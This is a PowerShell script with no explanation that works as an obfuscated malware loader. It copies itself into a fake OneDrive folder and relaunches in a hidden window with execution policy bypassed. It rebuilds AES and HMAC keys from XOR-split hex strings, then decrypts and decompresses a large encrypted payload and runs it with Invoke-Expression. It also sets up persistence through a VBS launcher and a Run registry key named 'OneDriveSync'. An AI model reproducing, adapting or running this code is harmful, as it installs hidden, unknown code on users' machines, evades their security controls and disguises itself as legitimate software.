$hst=$MyInvocation.MyCommand.Path
$wp2=[System.IO.Path]::Combine($env:LOCALAPPDATA,'OneDrive','win.ps1')
if($hst -and $hst -ne $wp2){
    $td=[System.IO.Path]::Combine($env:LOCALAPPDATA,'OneDrive')
    if(-not(Test-Path $td)){New-Item -ItemType Directory -Path $td -Force|Out-Null}
    Copy-Item $hst $wp2 -Force
    $si=New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName='powershell.exe'
    $si.Arguments='-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "'+$wp2+'"'
    $si.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
    $si.CreateNoWindow=$true
    Start-Sleep -Milliseconds 500
    [System.Diagnostics.Process]::Start($si)|Out-Null
    exit
}
[string]$ep0='35a2ac6b5e50c73cc630c865912f72588eec3332cb75a02fcedec456e1be0c3c2362deea053f4a77946e5167eca7ddf7855994962c8397da9a13f4aca4946f49e50b2881184c4039275bdb281c7172a871f4f24ad578a6468938bd79a9ef66e43e7e8551'
[string]$ep1='54f73339e2f2b815364019aa490fcd700c735a64ae7940f831944e8fb31796cfd5d98bc48cf69263f1e29a7a1824c00ca897ba6cf4a495a6a33b868d20e163b90f8bf8a92893ba2756495eea8933aac18d1cd59948bc099603c2776e7bf4f01c4efde93a'
[string]$ep2='a474f2a81c2a22e752111933c263d94f41e389a193021b8201efb6bd9390a8f7c6999ee8d96ea00c9bbf3af2a8c2c7a3eb3e070141764bad5eed0bed2df73ef97e6720e7fc93cbc743cc85cae9328e24ad548615895403038018b4451abc815814e9e7db'
[string]$ep3='16d45a2ccd055d044831478c6c178e3d175f627fd2a9e99f356410eee49a930f2efe8ff109103c2f41d83346bbc07ea451f4b6aa945fa0c440524f42ca463996374634a5a11fc99163de511bd4760e5d8ec4c7427a6730ef8e8d775b4e3ecc7cc9405b1a'
[string]$ep4='c25d4ab64a7f423feed2a50e319637e1c817e0f2a39d7617e0ebbd1f41c28e846f141f614bcb3af4a5b759bace269365f7d24a34df7eea8079bab753e5dedc0d5253341bbbd64d5482b2b26e00376e1d783f588c48030499b7fed0b397ca7cd33ddc51d2'
[string]$ep5='b97eb26dfbb589e98e80bfcfd7577b9564e8e2fb46df9d2802b311cbacc9a6ad0580772f25e0f64c1c24789381b40f1016b9f74401dc3c9152c0a138a56af8efa6d4f76f15b9328be799774d01387f91b0de978afd7ec639e40aa50c555923e478a9a8ae'
[string]$ep6='5529d41deaed3ce8b8adabdb1b2f13d3ffbe34e9311054f65eac2580d9a65c0d4d43be6a258baa0e3fa5cca5123f24c864b6825231cde96f2b28a8569bd15f767a42807f6c26b23f7d3bd0827e747f681cde138a6d803559b1568a03ffae053d5a31b679'
[string]$ep7='8c783461642149d0f950f3b8689f1bf6f600fefa2b7a3a00d2ed270610c71f0abf6e82fc9d32105d1941f363edb1f677e8757806e5ea3c4b95c2cb3d5757718ac377723270c4bc1d73fcfd452de4bba158057767e3927c9271c658eace90d20e5464bdb7'
[string]$ep8='e4a26d9d5a25409eee3208facf2648d66eb408acbd0c3a59b8113894e2008576b8e6e154bc5a686709ef77cf8f702033eac4315e933f6407b94a33ccb6fc429c3d5409d30b6265e4c4817aa06e6f9713302b2eb11c34c193d607930af33d7d6a81bb7bd9'
[string]$ep9='1d36abdd3dec6f6b0f3c5212cacc45efc5a7d60633e10e95457e136c7575c8cbd38e2230e3eaa3581d4eb67becc4596551226a96eed1ed7e1796681ca216e39b7dc2b74bd69b9603a5cde6bd19060d32bce3a5eaf92572d9517240591a69c8970562686f'
[string]$ep10='9806ea46eb9603c5e17bc0543b6026980e630173e722b89e7402eea08565731acffce94d844d938d90e144fa918d8a5d8b550bf509eb011dc0b584a6312b6a0ce0965016cbd467a199363e15c5b95392a3939fdb7549e868176d382b05474b6e78ad7128'
[string]$ep11='5563624a547ae97d91858b8a67b9f6d22d8f3e9150e4a3d21e9a77236c0af1c35af33028b3e91d888252d7731b97513f3759dbd2fe32646453950ed1c61ec9e5ebd53d1f870f29a68e5b6f5e4ba64e8d912561831e7c330f7dbf5df9ea6b222d55ffa6c0'
[string]$ep12='dfa6f4c2f1720afc20a34daadfcd8d3233a5147678898ac221187513e15b7de785441d93dbfe129930754a303972249be944df8e2d8496669cca25267144690767c255a7e41aa67e39cb33f38250b1156483326b20e5335c191ab2212cefb13f16d4ea62'
[string]$ep13='4c3d6557b4daca000478046ebfe54d9332e64a0249d450387d2f809b94cbd1a745b8091b798bf45cfe8fdcd52477af43926adcac3cf1dbcba6691b7046d732c0f65723179ff89e688359d2dab9e06349a7b173295bd4903063339745cfa62ae9552ad688'
[string]$ep14='621093ab99949dfd3be2c8febf15532e9cfb7d9f8cbad13175724698aac392367b67038799c4f3c3ae2e4515931461358637491d420f59a252cedcab6f1e035acf1e0bc85e7b14720439c2254bf5f81ab15d15159900b925db56a9b95b8a0baf43e487fb'
[string]$ep15='76ecac641884ec3962888ee819030d5247c7294ebbeded858b8b14064708c08cde31ac6a6c408a9cc025e4b1a91cac3317fc44de5adda01e20cbc9f60966716e7d2fc3e855e17e65421fb9ee3b38c18edcbe4615bbaa59e40ff0094128ea596fe50c99bb'
[string]$ep16='790e0bd51e4c0307bd31844fb898915321e354cea0039ad91a53096671a763f94de4c3895b006883b3402c4daa2ca93edcb574c84502329af6d9b47a4edecd19ee1646f4d210a0342327f0ad83df10f73d60c32debc3fb638b2d1fc8441aa8ef15deb119'
[string]$ep17='f8cc3fef3b1ca001c0ea5d55f43f61d0ed325feb297e653dc6600d3d5cc3e26499460faf9b4d4194af90cb79df264f0b3c83ce207c88ddb0ca33b437a0ed9f217ff88d3f6672e4f3a0bff6f927d616b1866790fdec98f6e4636f812f4079b4158650577e'
[string]$ep18='471d5781629f9a50ba63939d02170dfca656fc4cecfa9aaf1e3351a7e040c21deedb6416c8be710022ca1fdd7ace3368914190363eb109a5fa27f22f04baafc4e3e1e22ab4477a3a69cd42ea1b04e0b6dec4dc70f90e0eb3cd9728667efb9d481cb2c08c'
[string]$ep19='d210032df9fd068e701ca7598301ee6652d376f48d6d5aa59b0f3d7a5b2dffa2222d80d7fcda13fc48c397beeb339ea7704904dcd685b9c28e9604a3596fec135faaa80fbdcab0a66828cc208c7a638d06b29f3f33691978496908d92f5656e8333f79de'
[string]$ep20='457e6b37b81641c2be3d15c57f117dc84c135f5132d33c0a93e7c6891481214da61d5abb158353daf30e10058f7a71e9462010b37dbee013855c3fd3e7e301bf62252814c2d62c657368cd0ccc7fe0763a0468a14da399bad39d6cf205d3fd68c8b565cd'
[string]$ep21='465ebecd12bc99e4e4996ff636103f81d06f4631b86ff0928829291b'
$EP=$ep0+$ep1+$ep2+$ep3+$ep4+$ep5+$ep6+$ep7+$ep8+$ep9+$ep10+$ep11+$ep12+$ep13+$ep14+$ep15+$ep16+$ep17+$ep18+$ep19+$ep20+$ep21
[string]$a0='245aa89eab5b';[string]$a1='7745c5f909694d03';[string]$a2='006ad13513619470305554f3';[string]$a3='5d8e719a839a'
[string]$h0='bd0703cb195214';[string]$h1='0e9e59800b0be6e66ff21a';[string]$h2='3c9b8aef6caa';[string]$h3='b8a74a663495ff';[string]$h4='49'
function hx($h){
    $h=[string]$h
    $n=[int]($h.Length/2)
    $b=New-Object byte[] $n
    for($i=0;$i -lt $n;$i++){$b[$i]=[Convert]::ToByte($h.Substring($i*2,2),16)}
    return $b
}
function gk($hx2,$xk){
    $xkb=hx($xk)
    $d=hx($hx2)
    $o=New-Object byte[] $d.Length
    for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor $xkb[$i%$xkb.Length]}
    return $o
}
try{
    $AJ=$a0+$a1+$a2+$a3
    $AX='fe28f8c6da12efa693669e79debae4bb'
    $AK=gk $AJ $AX
    $HJ=$h0+$h1+$h2+$h3+$h4
    $HX='11518302cb15dc91296bc83917509d5a'
    $HK=gk $HJ $HX
    $PL=hx($EP)
    $IV=$PL[0..15]
    $SH=$PL[16..47]
    $ED=$PL[48..($PL.Length-1)]
    $hm=New-Object System.Security.Cryptography.HMACSHA256 -ArgumentList (,$HK)
    $ch=$hm.ComputeHash($ED)
    $ok=$true
    for($i=0;$i -lt $ch.Length;$i++){if($ch[$i] -ne $SH[$i]){$ok=$false;break}}
    if(-not $ok){throw 'HMAC failed'}
    $ae=[System.Security.Cryptography.Aes]::Create()
    $ae.Key=$AK
    $ae.IV=$IV
    $ae.Mode=[System.Security.Cryptography.CipherMode]::CBC
    $ae.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
    $dc=$ae.CreateDecryptor()
    $dd=$dc.TransformFinalBlock($ED,0,$ED.Length)
    $ae.Dispose()
    $ms=New-Object System.IO.MemoryStream(,$dd)
    $gz=New-Object System.IO.Compression.GZipStream($ms,[System.IO.Compression.CompressionMode]::Decompress)
    $os=New-Object System.IO.MemoryStream
    $gz.CopyTo($os)
    $gz.Dispose()
    $ms.Dispose()
    $code=[System.Text.Encoding]::UTF8.GetString($os.ToArray())
    $wp=[System.IO.Path]::Combine($env:LOCALAPPDATA,'OneDrive','win.ps1')
    $vbs=[System.IO.Path]::Combine($env:LOCALAPPDATA,'OneDrive','run.vbs')
    $vc='Set o=CreateObject("WScript.Shell")'+"`r`n"+'o.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""'+$wp+'""" ,0,False'
    [System.IO.File]::WriteAllText($vbs,$vc)
    Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value ('wscript.exe "'+$vbs+'"') -Force -EA SilentlyContinue
    Invoke-Expression $code
}catch{
    exit 1
}
